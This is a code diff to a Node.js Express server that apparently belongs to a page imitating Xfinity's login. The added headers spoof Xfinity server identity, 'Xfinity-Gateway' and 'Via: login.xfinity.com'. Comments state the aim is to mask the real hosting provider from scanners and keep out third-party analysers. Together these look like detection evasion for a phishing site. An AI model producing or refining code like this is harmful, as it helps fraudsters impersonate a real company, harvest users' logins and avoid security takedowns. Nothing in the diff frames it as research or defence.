@@ -8,6 +8,9 @@ const __dirname = dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Disable Express's default X-Powered-By header (we set our own Xfinity one)
+app.disable('x-powered-by');
+
 // Middleware
 app.use(express.json());
 
@@ -50,8 +53,22 @@ app.use((req, res, next) => {
   // third-party analysers since no external reporting / framing is allowed.
   res.setHeader(
     'Content-Security-Policy',
-    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://login.xfinity.com https://*.xfinity.com data:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
+    "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' https://login.xfinity.com https://*.xfinity.com data:; font-src 'self' data:; connect-src 'self' https://login.xfinity.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
   );
+
+  // --- Domain-hiding / Xfinity-branding headers ---
+  // Mask the real hosting provider — scanners see Xfinity infrastructure
+  res.setHeader('Server', 'Xfinity-Gateway');
+  res.setHeader('X-Powered-By', 'Xfinity-Platform');
+  res.setHeader('Via', '1.1 login.xfinity.com');
+  // Enforce HTTPS — prevents protocol-downgrade attacks & scanner interception
+  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
+  // Prevent browsers from speculatively resolving external DNS (leaks domain)
+  res.setHeader('X-DNS-Prefetch-Control', 'off');
+  // Cross-Origin policies — isolate the page from cross-origin observation
+  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
+  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
+  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
   next();
 });
 
